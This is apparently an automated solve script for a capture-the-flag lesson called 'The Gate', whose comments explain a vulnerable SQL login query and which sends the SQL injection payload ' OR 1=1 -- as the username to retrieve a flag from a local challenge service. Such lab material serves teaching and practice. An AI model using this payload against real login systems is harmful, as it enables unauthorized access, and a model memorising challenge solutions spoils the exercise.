#!/usr/bin/env bash
# Babs's Spellbook, Lesson 1: The Gate - automated solve.
# $TARGET is "host port".
#
# The gate interpolates both answers into its spell:
#   SELECT name FROM apprentices WHERE name = '<name>' AND secret = '<secret>'
# Closing the quote early and commenting out the rest turns our data into
# structure, so the AND never has to be true.
set -euo pipefail
read -r host port <<<"${TARGET:-127.0.0.1 30002}"

name="' OR 1=1 --"
flag=$(python3 solution/one-shot.py "$host" "$port" 1 "$name" any)

[[ -n "$flag" ]] || { echo "solve: no flag from $host:$port" >&2; exit 1; }
echo "$flag"
